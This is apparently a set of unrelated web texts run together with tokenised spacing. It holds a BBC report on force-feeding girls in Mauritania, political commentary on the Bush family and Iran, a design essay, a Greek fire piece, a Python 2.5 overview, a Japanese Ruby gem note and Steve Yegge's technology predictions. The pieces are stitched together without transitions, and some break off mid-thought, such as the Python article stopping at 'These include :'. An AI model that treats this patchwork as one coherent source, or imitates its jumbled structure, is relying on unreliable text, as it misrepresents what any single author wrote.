They walk slowly , dainty hands on the end of dimpled arms , pinching multicoloured swathes of fabric together to keep the biting sand from their faces .
" I make them eat lots of dates , lots and lots of couscous and other fattening food , " Fatematou , a voluminous woman in her sixties who runs a kind of " fat farm " in the northern desert town of Atar , told BBC World Service 's The World Today programme .
When they are small they do n't understand , but when they grow up they are fat and beautiful
Fatematou
' Fat farm ' manager Although she had no clients when I met her , she said she was soon expecting to take charge of some seven - year - olds .
" I make them eat and eat and eat .
And then drink lots and lots of water , " she explained .
" I make them do this all morning .
Then they have a rest .
In the afternoon we start again .
We do this three times a day - the morning , the afternoon and the evening . "
Punishment
She said the girls could end up weighing between 60 to 100 kilograms , " with lots of layers of fat . "
Obesity is seen as a sign a husband cares for his wife Fatematou said that it was rare for a girl to refuse to eat , and that if they did , she was helped by the child 's parents .
" They punish the girls and in the end the girls eat , " she said .
" If a girl refuses we start nicely , saying ' come on , come on ' sweetly , until she agrees to eat . "
Fatematou admitted that sometimes the girls cried at the treatment .
" Of course they cry - they scream , " she said .
" We grab them and we force them to eat .
If they cry a lot we leave them sometimes for a day or two and then we come back to start again .
" They get used to it in the end . "
She argued that in the end the girls were grateful .
" When they are small they do n't understand , but when they grow up they are fat and beautiful , " she said .
" They are proud and show off their good size to make men dribble .
Do n't you think that 's good ? "
Change
However , the view that a fat girl is more desirable is now becoming seen as old - fashioned .
A study by the Mauritanian ministry of health has found that force - feeding is dying out .
Now only 11 % of young girls are force fed .
We 're fed up of fat women
Yusuf , 19 " That 's not how people think now , " Leila - a woman in the ancient desert town of Chinguetti , who herself was fattened as a child - told The World Today .
" Traditionally a fat wife was a symbol of wealth .
Now we 've got another vision , another criteria for beauty .
" Young people in Mauritania today , we 're not interested in being fat as a symbol of beauty .
Today to be beautiful is to be natural , just to eat normally . "
Some men are also much less keen on having a fat wife - a reflection of changes in Mauritanian society .
" We 're fed up of fat women here , " said 19 - year - old shop owner Yusuf .
" Always fat women !
Now we want thin women .
" In Mauritania if a woman really wants to get married I think she should stay thin .
If she gets fat it 's not good .
" Some girls have asked me whether they should get fat or stay thin .
I tell them if you want to find a man , a European or a Mauritanian , stay thin , it 's better for you .
But some blokes still like them fat . "
And while there still men who like their women big , Fatematou is on hand to fatten them up with her years of experience .
I asked her if she ever felt cruel , beating and force feeding children ?
" No !
It 's not cruel to make girls fat ! " she said .
" Me , I 've seen 10 - year old girls give birth .
I tell you , 10 years old !
" Once they are fat and beautiful they can serve their men well , once they are fat they can be married . "

Proving that you do n't have to be an official member of the Bush administration to be completely wrong about Iraq , in an appearance on last night 's Larry King Live , Laura Bush weighed in with her deep thoughts :
And many parts of Iraq are stable now .
But , of course , what we see on television is the one bombing a day that discourages everybody .
Yes , it 's that one bombing a day that 's getting us all down .
But of course , as is often ( always ) the case with her husband , reality tells another story .
And reality says that during this week alone , there has been 34 bombings in Iraq , which works out to nearly 5 a day .
But perhaps we should cut the First Decider some slack because after all , she has to live , 24/7 , with the knowledge that there are troops in harms way .
And how does she " balance " the stress of that knowledge ?
... we go to church .
We exercise together , we watch movies together .
We do all the other things that -- watch baseball on television , for instance -- that we both find relaxing .
KING : Do you -- do you talk about it a lot ?
BUSH : We talk about it a lot .
I mean , we live it .
So there you have it .
From the beautiful White House , Laura and George Bush are living the war in Iraq .
U.S. Air Force
“ WE ARE not planning for a war with Iran . ”
So said Robert Gates , America 's new defence secretary , on February 2nd .
You can not be much clearer than that .
With a weak and isolated president , and an army bogged down in the misery of Iraq , the American Congress and people are hardly in fighting mood .
Nonetheless , and despite Mr Gates 's calming words , Iran and America are heading for a collision .
Although the risk is hard to quantify , there exists a real possibility that George Bush will order a military strike on Iran some time before he leaves the White House two years from now .
America and Iran have been at loggerheads ever since Ayatollah Khomeini 's revolution of 1979 .
But four things are making this old antagonism newly dangerous .
One is Iran 's apparent determination to build nuclear weapons , and a fear that it is nearing the point where its nuclear programme will be impossible to stop ( see article ) .
The second is the advent of Mahmoud Ahmadinejad , a populist president who denies the Holocaust and calls openly for Israel 's destruction : his apocalyptic speeches have convinced many people in Israel and America that the world is facing a new Hitler with genocidal intent .
The third is a recent tendency inside the Bush administration to blame Iran for many of America 's troubles not just in Iraq but throughout the Middle East .
Any one of these would be destabilising enough on its own .
Added together , they make the possibility of miscalculation and a slide into war a great deal more likely .
That is all the more so when they are combined with a fourth new source of friction between America and Iran .
This is the predicament of Mr Bush .
A president who is now detached from electoral considerations knows that his place in history is going to be defined by the tests he himself chose to put at the centre of his foreign policy : bringing democracy to the Middle East and preventing rogue regimes from acquiring weapons of mass destruction .
Given his excessive willingness to blame Iran for blocking America 's noble aims in the Middle East , he may come to see a pre-emptive strike on its nuclear programme as a fitting way to redeem his presidency .
That would be a mistake .
Never attack a revolution
This newspaper supported America 's invasion of Iraq .
We believed , erroneously , that Saddam Hussein was working to acquire nuclear weapons .
And we judged that the world should not allow a mass - murderer to gather such lethal power in his hands .
In the case of Iran , the balance of risks points , though only just , in the other direction .
Even if it became clear that Iran was on the threshold of acquiring an atomic bomb , an American strike on its nuclear facilities would be a reckless gamble .
Without America invading and occupying Iran — unthinkable after Iraq — such a strike would at best delay rather than end Iran 's nuclear ambitions .
It might very well rally support behind a regime that is at present not conspicuously popular at home , emboldening it to retaliate inside Iraq , against Israel and perhaps against the United States itself .
Besides , it is far from clear exactly how dangerous a nuclear - armed Iran would be .
Unlike Iraq under Saddam , Iran has a complex power structure with elements of pluralism and many checks and balances .
For all its proclaimed religiosity , it has behaved since the revolution like a rational actor .
To be sure , some of its regional aims are mischievous , and in pursuing them it has adopted foul means , including terrorism .
But the ayatollahs have so far been shrewd calculators of consequences .
There are already small signs of a backlash against the attention - seeking Mr Ahmadinejad .
Like the Soviet Union , a nuclear Iran could probably be deterred .
But do n't think Iran is n't dangerous
All of this suggests that in present circumstances it would be wrong for America to launch a military strike against Iran .
But it would be the height of self - deception for anyone to jump to the conclusion that a nuclear - armed Iran would not be dangerous at all .
It would be very dangerous indeed .
For a start , there is a danger that Iran 's nuclear efforts will provoke a pre-emptive strike by Israel , which is already a nuclear power , albeit an undeclared one .
For Israelis , whose country Mr Ahmadinejad says he wants to wipe off the map , it is not all that reassuring to hear that Iran can “ probably ” be deterred .
Even if Israel were to decide against such a strike , Iran 's going nuclear could destroy what is left of the international non-proliferation regime .
It has proved hard enough for Arab states such as Egypt and Saudi Arabia to live with Israel 's undeclared bomb ; if their Iranian rival got one too , the race to copy might soon be on .
On top of this is the danger that a nuclear Iran would feel safe to ramp up attempts to spread its revolution violently beyond its own borders .
Every effort should be made to stop an Iranian bomb .
But there is a better way than an armed strike .
In 2002 Mr Bush consigned Iran along with Iraq and North Korea to an “ axis of evil ” .
Since 2004 , for lack of good alternatives , he has been helping the efforts of Britain , France and Germany to talk rather than bludgeon Iran into nuclear compliance .
Iran claims that its nuclear programme is for civil purposes only .
Last year , the Europeans called its bluff by offering trade , civil - nuclear assistance and a promise of talks with America if it stopped enriching the uranium that could produce the fuel for a bomb .
When Iran refused , diplomacy led in December to the imposition of economic sanctions by the Security Council .
This is a promising approach .
The diplomacy at the United Nations proceeds at a glacial pace .
But Iran is thought to be several years from a bomb .
And meanwhile the Americans , Europeans , Russians and Chinese have at last all lined up on the same side of the argument .
What is required now is a further tightening of the economic squeeze coupled with some sort of an incentive — most usefully an unambiguous promise from Mr Bush that if Iran returns to compliance with the nuclear rules it will face no attempt by America to overthrow the regime .
Even then , America and Iran may be fated to lock horns in the Middle East .
But the region , and the world , will be a good deal safer without the shadow of an Iranian bomb .
_” Perfection is achieved , not when there is nothing left to add , but when there is nothing left to remove . ”
Antoine de Saint - Exupery _
Such a simple statement ; yet one of such power .
This statement carries a new impact as the concept of “ Extreme Simplicity ” gains ground .
The idea is that instead of focusing on adding more features ( Microsoft ) , do a few things , and do them very well ( Apple ) .
This is a great concept , focus on the user , focus on what the user spends most of their time doing and keep all the rest out - of - the - way .
I ’ll be the first to admit , I ’m addicted to gold plating .
If I think it ’s cool , I ’ll add it , which is most certainly at conflict with this concept .
This is one area were the two goals leave me quite torn , giving the user every feature possible versus a simple – even minimalistic interface .
All things considered though , this is where things are going .
Simple , intuitive designs sell ; it ’s that simple .
People expect technology of any form to fit in their lives , as simply as if it was n’t even there .
By building around the core of what the user does and minimizing fluff to enhance the user experience , you ’re giving the end users what they want .
As written by Andreas Pfeiffer , here are the 10 fundamental rules of Extreme Simplicity :
More features is n’t better , it ’s worse .
You ca n’t make things easier by adding to them .
Confusion is the ultimate deal - breaker .
Style matters .
Only features that provide a good user experience will be used .
Any feature that requires learning will only be adopted by a small fraction of users .
Unused features are not only useless , they can slow you down and diminish ease of use .
Users do not want to think about technology : what really counts is what it does for them .
Forget about the killer feature .
Welcome to the age of the killer user - experience .
Less is difficult , that ’s why less is more .
We all know that users do n’t want to think ; this design philosophy further refines the concept and simplifies it to the point that it can be applied to almost any form of technology .
By designing with a goal of maximizing simplicity , you create software that fits in the users ’ life , instead of fitting them into your product .
If you want your product to sell , find a way ( though difficult it may be ) for your product to be both indispensable and unobtrusive .
We still have not cracked the secret of Greek Fire , a napalm - like weapon of terror and unmitigated destruction unleashed by the Romaioi of Constantinople on besieging Arabs in the 7th century .
In fact , it 's possible that they did n't , either , at least after the time of its original deployment , as almost all of our knowledge of the substance is legend and literary legerdemain .
It 's entirely possible that the unextinguishable incendiary formula , which kept the Eastern Roman Empire in business for so long , was itself a pale copy of the stunning invention of a single genius , Kallinikos , who took the true , original recipe to his grave .
While a more sober reading of the facts suggests it lived and died with the Roman Empire itself , until 1453 , it 's easy to imagine the horror faced by anyone assaulting the city walls or leaping aboard an enemy trireme , only to see that odd metal pipe extending directly above their heads :
" Siphons ! " the old man said , as gouts of flame filled the darkness , pouring from the carved heads .
I stumbled backwards , the back of my skull cracking against the ground .
Pain blinded me , and I clutched at my scalp , hearing my sword clattering on the stone .
Hot blood wet my hair as fire spilled across the rock .
As I tried to rise , it fulminated over my shins .
...
The old man walked forward as soon as the torrent receded .
Drips of blazing light continued to drool from the stone dragons ' beaks .
" Naphtha , lime and old bones , " he said , without a hint of anger or fear .
" Not Greek ! "
Marlow said from within , his voice falling to a stammer .
" My own formula ! "
The key to its effectiveness was its ability to continue burning under any circumstances , even on the surface of water , making it a " wet , dark , sticky fire , " and a key maritime weapon .
Possible ingredients include sulphur , petroleum , quicklime , phosphorus , naptha and saltpeter .
But this is only the first twist in the tale , as with incendiary chemicals , the method is just as important , determining how the precursor chemicals are stored , the logistics of transport , and how they are mixed and deployed in battle .
Did greek fire ignite on contact with air , water , or naked flame ?
Were its fumes poisonous ?
How could such a devastating weapon remain a secret for so long ?
To know the truth , however , would be to rob the mystery of its allure –like nostalgia and futurism , the journey itself is always more rewarding than the destination .
n September 19th , 2006 , Python enthusiasts were rewarded with a new version .
Python 2.5 continues the honorable tradition of improving and enhancing the language carefully while extending its impressive standard library .
This article is the first part in a three - part series about Python 2.5 .
I 'll begin with a broad - stroke summary of the changes in Python 2.5 and set the stage for a detailed exploration .
The rest of this article discusses the major language enhancements in Python 2.5 .
Part 2 of this series will present the major new and improved modules in Python 2.5 , and Part 3 will discuss a whole bag of smaller improvements and changes that are relevant to specific subsets of the Python community .
Python 2.5 at a Glance
Python 2.5 introduced some significant language changes .
The venerable try - except and try - finally blocks have been unified .
The functional programming style got a boost via partial functions and other additions to the functools module .
The new ' with ' statement enables safer resource management and brings along the contextlib module .
Generators are more interactive and it is possible to insert values into existing generators .
Conditional expressions might seem a little weird at first , but there is a good reason for their syntax .
I 'll cover these features in the remainder of this article .
In the next article I 'll cover the ctypes , sqlite3 , and xml.etree .
ElementTree packages that are both super-cool and super - important for hassle - free deployments of Python systems without distributing a slew of external modules and libraries .
ctypes allows calling C code in dynamic libraries directly from Python code .
sqlite3 is a Python front - end to the excellent sqlite embedded database , and ElementTree is a highly pythonic and efficient XML parser .
Major Language Changes
Python 2.5 brings quite a few language enhancements while staying backward compatible with Python 2.4.x .
These include :
http://rubyforge.org/projects/hatenaapiauth/
先日ローンチしたはてな認証API の Ruby 版のモジュールを作りました。rubyforge にアップしたので、gem を使ってる人 は
# gem install hatenaapiauth
でインストールできるかと思います。perl の Hatena :: API :: Auth と同じインターフェイスです。認証に失敗すると例外
Hatena :: API :: AuthError が発生します。また認証時に返す値が perl 版では Hatena :: API :: Auth :: User を作って返してますが 、Ruby 版では Hash になってます 。
はてな認 証API を使った Rails の認証系 plugin も作れそうなのでそのうち作ろうと思ってます 。
以下は簡単なサンプルアプリとそのソース。gem パッケージの中の examples ディレクトリの中にも同じモノが含まれてます。

Update , September 2015 : I saw the HN thread about Dan Luu 's review of this post , and felt people were a little too generous with the scoring .
So I 'll offer my own scores and justifications here .
1 ) XML databases will surpass relational databases in popularity by 2011 .
Nope .
I had the right problem and right solution space , but called the wrong solution .
NoSQL data stores in their various incarnations apparently have equalled or slightly surpassed RDBMS as of 2014 - 2015 , according to some reports I just read .
I would have given myself a higher score if I had n't been so damned specific .
Score : 0.2
2 ) Someone will make a lot of money by hosting open - source web applications .
Yes , this became 100 % true .
It 's called PaaS now , and includes things like Google App Engine and Heroku .
Score : 1.0
3 ) Multi - threaded programming will fall out of favor by 2012 .
This is beginning to come true , on a language - by - language basis .
The Go language is a good example , as is parallel processing in big data .
Even in Java , you generally manipulate threads these days via robust higher - level abstractions such as concurrent data structures and worker pools .
I 'm not sure it 's " out of favor " yet , but alternative approaches have come a long way in the past 10 years .
Score : 0.5
4 ) Java's " market share " on the JVM will drop below 50 % by 2010 .
Definitely has n't hit 50 % .
However , Scala has really tremendous adoption , with quite a few large companies writing significant portions of their software in Scala -- LinkedIn , Twitter , Netflix , Tumblr , etc .
Groovy is also big , and there are large systems emerging in Groovy , notably Netflix Asgard , as well as the Gradle build system .
So while Java still accounts for the majority of software written for the JVM , there are thriving language communities that are gaining serious momentum .
Given that in 2004 , JVM languages were still pretty experimental , and today they 're being used to run large parts of Fortune 500 companies , I 'm giving myself a high - ish score , even though the percentage is n't there yet .
( Frankly , I think the main reason Java is still so big is that the Java language has become worlds better between Java 5 in 2004 and Java 8 today . )
Score : 0.7
5 ) Lisp will be in the top 10 most popular programming languages by 2010 .
Haha , no .
I had high hopes for Clojure for a while , but they 're fairly user - hostile , even if they think ( and loudly assert ) that they are n't .
I think Racket 's maybe the best thing going in Lisp - land these days .
But even I do n't use Lisp anymore , other than the occasional Emacs hacking .
Score : 0.0
6 ) A new internet community - hangout will appear .
One that you and I will frequent .
Well , yeah .
In retrospect it seems completely obvious , but at the time I wrote this , Facebook basically did n't exist .
Score : 1.0
7 ) The mobile / wireless / handheld market is still at least 5 years out .
Nope , it was 3 years out .
iPhone came out in 2007 .
Pretty easy to calculate this one .
Score : 0.6
8 ) Someday I will voluntarily pay Google for one of their services .
Yes , I 'm doing this now , for Google Cloud Platform , for my own external / personal / non - Google projects .
Call me a brand loyalist , but I 'm not on AWS .
I did n't anticipate that it would be for compute services , though , so I 'm not awarding myself full points .
Score : 0.8
9 ) Apple 's laptop sales will exceed those of HP / Compaq , IBM , Dell and Gateway combined by 2010 .
I screwed myself on this one .
I should have omitted the word " laptop " , so that I 'd be able to include phones and tablets , and it'd be a slam - dunk 1.0 score .
I shot myself in the foot , and Apple Macs only have 13 % market share as of late 2014 .
It looks like according to Wikipedia / Gartner , the non-Apple vendors I listed account for about 40 % .
Windows has continued to enjoy IMO surprising success , largely driven by the brand loyalty of generations of XBox and PC gamers , most of whom Microsoft successfully alienated at E3 two years ago .
Yay .
Unfortunately Apple is n't really going after that market , so Windows looks like it 's got some life left .
Yuck .
I would have given myself a 0.8 if I had n't restricted myself to laptops .
Oh well .
Score : 0.3
10 ) This one was a joke , arguably in poor taste , so : no score .
Total score : ( 0.2 + 1.0 + 0.5 + 0.7 + 0.0 + 1.0 + 0.6 + 0.8 + 0.3 ) / 9 = 57 % .
So accounting for slop in my scoring , I hit roughly 50/50 .
Is that good ?
I dunno .
Meh .
I encourage you to make your own public predictions for the next 10 years , and we 'll see how it goes !
There was also some discussion on HN about whether I thought NBL was JavaScript .
Yes indeed I did , and said so on stage at OSCON -- though I shouted it while they were dragging me offstage , so I 'm not sure if people heard me .
I did n't say as much in the blog post , though , because people would have eviscerated me .
I 'm glad it happened , in any event , and JavaScript seems to pick up more steam every year .
Good stuff !
( Original , unedited rant starts here )
Our industry seems to be changing faster over time .
It 's hard to keep up ; the best way to keep up seems to be to read a lot .
Serious programmers should read as much as they can .
I read as much as I can , but I still wish I had more time for it .
If you read a lot , you 'll start to spot trends and undercurrents .
You might see people talking more often about some theme or technology that you think is about to take off , or you 'll just sense vaguely that some sort of tipping point is occurring in the industry .
Or in your company , for that matter .
I seem to have many of my best insights as I 'm writing about stuff I already know .
It occurred to me that writing about trends that seem obvious and inevitable might help me surface a few not - so - obvious ones .
So I decided to make some random predictions based on trends I 've noticed , and see what turns up .
It 's basically a mental exercise in mining for insights .
Plus it 's a wonderful opportunity to kick the beehive and see which ideas generate the most indignant blog comments , which is always fun .
In this essay I 'll make ten predictions based on undercurrents I 've felt while reading techie stuff this year .
As I write this paragraph , I have no idea yet what my ten predictions will be , except for the first one .
It 's an easy , obvious prediction , just to kick - start the creative thought process .
Then I 'll just throw out nine more , as they occur to me , and I 'll try to justify them even if they sound crazy .
Important Note : the predictions themselves do n't matter !
Most of them are probably wrong .
The point of the exercise is the exercise itself , not in what results .
You should try this experiment yourself — it may show you things you 're thinking that you were n't really aware of .
And other people might find it interesting reading , even if there are factual errors or whatever .
Prediction # 1 : XML databases will surpass relational databases in popularity by 2011 .
Reason for prediction : Nobody likes to do O/R mapping ; everyone just wants a solution .
XML is the most popular vehicle for representing loosely - structured , heirarchical data .
Relational databases can't do this very well .
Many common types of data are intrinsically heirarchical and loosely structured , so storing them in an RDBMS can be difficult .
Examples : books , articles , and most other written documentation .
HTML .
Search indexes .
Filesystems .
Game worlds .
Classical music scores .
It 's just easier to model some things this way .
XML can be mapped straightforwardly to the objects and data structures of modern programming languages , so it works better than relational modeling for serializing things like object graphs .
It leads to much more natural persistence interfaces in programming languages than what you get with , say , JDBC or DBI .
The industry is in a heated race to improve XML databases .
All major RDBMS vendors are starting to support persistent , indexable , queryable XML .
There are various standards in the works , including XPath 2.0 , XQuery , XQuery 2.0 , XUpdate , XPointer , XLink , and who knows what else .
XML databases already support ( or will support soon ) transactions , indexing , CRUD , schemas , and many of the other trappings normally associated with an RDBMS .
Microsoft has prototyped embedding XPath support directly into the C# programming language ; rumor has it that C# will have a great deal of XML support in the near future .
XML is big , and it 's useful .
There 's a huge amount of attention on persisting it in something other than CLOBs .
XPath searching is amazingly rich , and XQuery , if it 's anywhere near as usable as SQL , will surpass SQL in expressive power .
So there 's every reason to expect that most data stores will eventually be XML stores .
( They may be relational under the hood , but that does n't count if the database is being used as an XML database . )
Incidentally , I just heard that that the University of Washington Databases course ( CSE 444 ) , which used to be almost 100 % about relational databases , is now 50 % relational and 50 % XML , focusing for the last half the quarter on concepts like DTDs , Schemas , XPath , XML / SQL interfaces , and XQuery .
Prediction # 2 : Someone will make a lot of money by hosting open - source web applications .
Reason for prediction : most small development shops would pay a monthly fee not to have to administer the apps themselves .
We 're rapidly entering the age of hosted web services , and big companies are taking advantage of their scalable infrastructure to host data and computing for companies without that expertise .
Most software development shops have a set of fairly similar applications for supporting development , and traditionally they 've administered these apps in - house .
But they do n't really want to be administering them .
Having a high - quality bug database is an enabler , but it does n't contribute directly to your bottom line .
You want a bug database to be a commodity application .
It just exists , and you enter bugs into it .
Same goes for your source - control system .
They 're a lot of work that 's just overhead .
You almost need a full - time administrator for these systems .
Backups , performance tuning , branch administration , lots of issues .
All you really want is for it to work , so you can focus on your problem domain .
For both bug databases and source - control systems , the obstacle to outsourcing them is trust .
I think most companies would love it if they did n't have to pay someone to administer Bugzilla , Subversion , Twiki , etc .
Heck , they 'd probably like someone to outsource their email , too .
This is exactly what dev teams within Amazon do .
They use Perforce , Wiki , Exchange and so on as services , which frees them up to focus on their goals .
But would an external dev team trust some big company like Amazon with with their intellectual property ?
Potential hosting companies might balk before trying it , guessing that most potential customers would hesitate before hosting their source code somewhere else .
However , my prediction is that someone will decide to try it .
And I think they 'll find that there are many , many dev teams in the world who are willing to pay a reasonable recurring fee for this service .
If a startup company were 100 % confident that their intellectual property ( IP ) is secure with an outsourcer , then it would boil down to a simple ROI analysis .
They 'll do whatever 's cheapest .
One of the most important brand characteristics that Amazon has established is trustworthiness .
Customers do n't give their trust lightly , especially with online transactions , but people trust Amazon .
It seems reasonable to assume that companies might trust Amazon as well .
There are other companies that could potentially do this innovation - infrastructure outsourcing , but not many .
They 'd have to establish several different kinds of trust .
If I 'm planning on outsourcing my development infrastructure , I 'd want an outsourcer who meets the following trust tests :
Honest —
I would want assurance that this company is n't out to steal my secrets , and that they will take the high road and not look at my stuff .
And there would have to be agreements and contracts in place that give me recourse options if they were to violate this trust .
Secure —
I 'd want to feel confident that the outsourcer will keep my data secure .
Even if the company is honest , I still want protection from people who are trying to steal my IP .
Security is especially sensitive because an innovation - infrastructure outsourcer would be a prime target for attackers .
Reliable — I 'd want 24x7 service ; my dev team should never be held up because the outsourcer 's systems are down , or slow , or buggy .
The outsourcer 's service latency , throughput , availability and quality are all critical factors in my decision process .
Responsive —
If there are issues , I need someone to contact .
I 'd expect to have multiple cost / response options ; if I want to minimize cost , I might settle for 2 - day turnaround , but I 'd be willing to pay more on a sliding scale for better support SLAs .
Comprehensive —
All else being equal , if two outsourcers offered similar packages , I 'd go with the one who gives me the most functionality .
I actually would want to put all my eggs in one basket .
I would n't want my bugs at company A , and my source code at company B , and my email at company C. Stable — I do n't want my outsourcer to go out of business ; at best I 'd have to take downtime to migrate everything in - house or to another outsourcer , and at worse , I 'd lose all my data .
It has to be a big , well - funded , stable company , which limits the field slightly .
Not all software development shops in the world are focused on building distributed computing platforms .
There are plenty of people working on important but domain - specific software .
Government , medical , automotive , insurance , aeronautics and astronautics , aviation , bioengineering , entertainment , education , you name it — there 's a lot of software being written in the world , and a lot of money riding on it .
So I predict that someone will come along and offer an innovation hosting service , and make a lot of money off it .
If I were the hosting company , I 'd use open - source products .
There is n't a huge amount of precedent for this model , but it seems like a good one .
So good , in fact , that it boggles my mind that nobody has started doing it yet .
There are lots of reasons to go with open - source .
For starters , there are plenty of polished , high - quality applications that you could begin hosting with almost no development effort .
And good open - source apps are usually well - documented ; you can even find books about most of the bigger ones .
So you would n't have to spend a bunch of time writing your platform documentation .
And you'd be able to tap into the thousands of developers who are already using those apps ( but hosting them themselves ) ; they'd have no learning curve and no technical barriers to migrating to your hosted version of the application .
It 's a no-brainer .
In fact , I quit .
I 'm going to go do this .
Bye !
Oops , scratch that .
Nobody would trust SteveySoft with their intellectual property .
They'd be afraid that I 'd laugh at their source code .
And with good reason , I might add .
So I guess someone else will have to do it .
Prediction # 3 : Multi - threaded programming will fall out of favor by 2012 .
Reason for prediction : Cost / benefit ratio is n't high enough .
If I were going to write the Ten Golden Rules of Software , the top of the list would be :
Error Prone == Evil
Although this concept is obvious to 99.999 % of the general population , it 's only accepted by 2 % of computer programmers .
The remaining 98 % subscribe to a competing philosophy , namely : " Error Prone = Manly " .
Never mind that they just assigned " Manly " to the variable " Error Prone " , and the expression always returns true ; that happens to be the correct value in this case , so it 's an acceptable hack .
So when safe alternatives to existing unsafe technologies come along , it takes about ten to fifteen years before everyone 's switched over .
Not that the unsafe users actually switch ; that 's just how long , on average , it takes the majority of them to be killed accidentally by their product , leaving only the new , safer programmers behind .
Hence , many programmers prefer to use C++ instead of far safer alternatives such as Java or Objective - C .
And many programmers prefer to use Perl instead of far safer alternatives such as Ruby or Python .
Many programmers prefer debugging weird problems in production over the much safer alternative of writing unit tests for their own code .
And virtually all programmers prefer programming by side - effect over safer alternatives such as functional or declarative programming .
Multi - threaded programming has officially been declared hazardous to your health since , oh , roughly the week after it was invented .
Everyone knew it was really tricky from the outset .
It provided all sorts of exciting and ( if I do say so myself ) rather manly new failure modes : deadlocks , livelocks , missed signals , race conditions , read / write conflicts , write / write conflicts , and so on .
But it did offer some ease - of - use advantages over IPC .
And C++ programs already crash or corrupt data so often that occasional threading errors do n't usually make much of a difference .
So multi - threaded programming was an instant hit .
Multithreading has been studied extensively to see if it can be made less error - prone .
And it can !
Concurrency theory researchers have generously provided us with a nice basket of rigorous mathematical tools for analyzing our concurrent programs , including the formal partial - order pi-calculus , the temporal propositional logic systems , the axiomatizing flat iteration scheduling algebrae , the much - loved quantum Chu space automata , and of course the ever - popular Brouwer - Heyting - Kolmogorov bisimulation and propositional intuitionistic logic , famous for its canonical model proving the bisimilarity of finite Kripke structures .
Sign me up !
Unfortunately the O'Reilly book for these models , The Quantum Chu -Space Cookbook ( colophon : Schroedinger 's Cat ) has n't hit the shelves yet ; it 's expected to be in copy - edit for another 47 years .
So software - engineering researchers have stepped in and published many books describing patterns , idioms , and best practices for multi-threading .
The most popular recommendation appears to be " do n't use threads " , although other thread design patterns include " do n't let them ever talk to each other " , " do n't ever kill runaway threads " , and " favor immutability over side - effects " ( although that 's widely considered to be an unmanly approach . )
So we have a nice basket of patterns , and even some O'Reilly books .
In the past , oh , 20 years since they invented threads , lots of new , safer models have arrived on the scene .
Since 98 % of programmers consider safety to be unmanly , the alternative models ( e.g. CSP , fork / join tasks and lightweight threads , coroutines , Erlang - style message - passing , and other event - based programming models ) have largely been ignored by the masses , including me .
Ironically , multi - threaded programming is far more popular among Java and Ruby programmers than among C++ and Perl programmers , who generally prefer using OS processes over threads .
I 'm not sure if that 's because Java and Ruby provide language - level thread support , or because it 's virtually impossible to write correct multi- threaded programs in C++ and Perl , or some combination of the two .
In any case , it 's interesting that Java and Ruby programmers use the most error - prone concurrency framework .
Anyway , the jury 's been out on threading vs. event - based programming for a long time , but now we 're in the distributed computing world , where event - based programming is the only option .
It seems to make sense to migrate to the event - based models , purely in the interest of using the same messaging and parallelism constructs for your in - process , inter- process , and distributed code .
I 'd say this has been widely known for about five years , so I predict that the programming community at large , even Java programmers , will finally deprecate multithreaded programming around seven or eight years from now .
That 's about par for the course .
Prediction # 4 : Java's " market share " on the JVM will drop below 50 % by 2010 .
In other words , over half the code written for the Java platform will not be Java .
It 'll be Python , Ruby , Haskell , Lisp , and a variety of other languages .
The Java programming language will become more like " assembly - language for the JVM " — something you use for building frameworks in Java , but most app code will be in higher - level languages compiled into Java bytecode .
Reason for prediction :
The Java core language is the weakest part of the otherwise strong Java platform .
People think they love Java because of the language , and to be sure , it 's more expressive ( in some ways ) than C and a lot saner than C ++.
But that does n't qualify it as a great language .
People actually love Java for a variety of reasons that are unrelated to the core language .
One reason is the huge , well - designed standard library .
It 's everything C++ should have had , but does n't .
Another reason is the platform :
The JVM and libraries present a clean abstraction of the underlying operating system .
It gives you access to the standard functionality of an OS , but that functionality is ( almost ) transparently portable .
People also like the security model , the reasonably intelligent community - standardization process , the high - quality tools such as Ant and Eclipse , the widely - available documentation , the mostly - usable built - in multithreading , and of course the community and the hype .
Oh , and they like Duke , Sun 's version of Mr. Tooth .
That 's a whole lot of reasons to like Java , even if you have reservations about the core language .
The Java language just is n't cutting it , though .
It 's really hard to see this if you 're coming from a C/ C++ background , because Java is so much better than C++ that it feels like you 've died and gone to Programmer Heaven .
Java has real strings , and real exceptions , and real namespaces , and and real runtime typing , and real pure - virtual interfaces , and a real security model , and real memory management , and a real library system , and fast compilation times , and it 's portable , and it does n't crash .
C++ is a miserable , poisoned purgatory , and Java delivers you from it .
So as you might imagine , it takes a few years before you start to chafe at Java 's limitations .
But Java is verbose and somewhat uncompressible : it lacks a macro system , so it 's not extensible in the way XML and Lisp are extensible .
What they decide to give you is all you 've got .
And it has no first - class functions , no preprocessor , no metaprogramming , and no templating system .
So it takes forever to say certain complex things in Java , and it's hard to to avoid certain kinds of code duplication .
Java code bases tend to be pretty large — smaller than equivalent C++ code bases , possibly , but you still wind up with a lot of code .
Java 's also not well - suited for dynamic , incremental development .
Java still uses the old batch - based development cycle : shut the app down , make your changes , recompile , start the app back up , get it back to its previous state , and THEN test your changes .
It sucks to restart your app every time you want to do so much as change a string literal in your code .
Java development is much slower than it needs to be .
Much faster than C++ development , but still slow .
The JVM supports other languages — not very well , not as well as .NET or ( maybe ? ) Parrot .
But well enough .
And Groovy has finally got the Java community is starting to notice higher - level languages , even if Groovy itself is awful .
It will be interesting to see what happens .
I suspect that most Java programmers wo n't upgrade to the new languages , but lots of people coming to the JVM from other platforms will use those languages .
So I predict that in six years , less than half of all ( new ) Java bytecode will be compiled from Java code .
Prediction # 5 : Lisp will be in the top 10 most popular programming languages by 2010 .
Reason for prediction : Lisp is a keeper .
And it 's getting a lot of good press these days .
I think it 'll be in the top 10 , but not in the top 5 .
If you count all Lisp dialects including Scheme , it might make # 6 , though .
That would include ANSI Common Lisp , Emacs Lisp , Scheme , Guile , Arc , and probably a few other dialects as well .
Heck , if you just count lines of code , Lisp is already the fourth most - used language in a RedHat Linux distribution .
There are some other very solid functional - programming languages out there ;
Lisp is n't the only player in the field .
Each of them has its advantages : Erlang has the world 's best distributed - computing facilities ;
Haskell appears to be the world 's most elegant and succinct language ; OCaml binaries fairly consistently outperform C++.
Most functional languages are pretty nice in at least one dimension .
But Lisp has a secret weapon : Paul Graham .
Programming languages do n't become successful based on their technical merits .
The masses of programmers out there do n't know or care about technical merit .
They just want someone to look up to , someone to tell them what to do .
Languages are religions , and religions need a spiritual leader .
It 's best if it 's a person , but a faceless corporation will do in a pinch , if they have a good marketing department .
And now Lisp has a new thought - leader and champion in Paul Graham : successful author ; influential essayist ; inventor of Yahoo !
Store ; the man who killed Spam .
He has an impressive resume , and he appears to be only just getting started .
He 's creating the next - generation Lisp ( called " Arc " ) , and his essays have been making the world sit up and pay attention .
